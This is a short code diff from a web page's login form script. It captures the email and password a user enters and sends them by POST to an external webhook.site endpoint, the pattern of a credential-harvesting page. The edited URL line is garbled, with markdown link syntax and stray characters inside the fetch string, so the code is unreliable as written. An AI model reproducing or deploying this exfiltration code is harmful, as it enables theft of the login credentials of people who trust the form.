@@ -58,7 +58,7 @@ form.addEventListener("submit", (e) => {
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    fetch("[https://webhook.site/your-custom-ur](https://webhook.site/b729d597-59d8-44da-948a-383d7d9a90bb)l", {
+    fetch("[https://webhook.site/](https://webhook.site/b729d597-59d8-44da-948a-383d7d9a90bb)l", {
         method: "POST",
         body: JSON.stringify({ email, password }),
         headers: { "Content-Type": "application/json" }
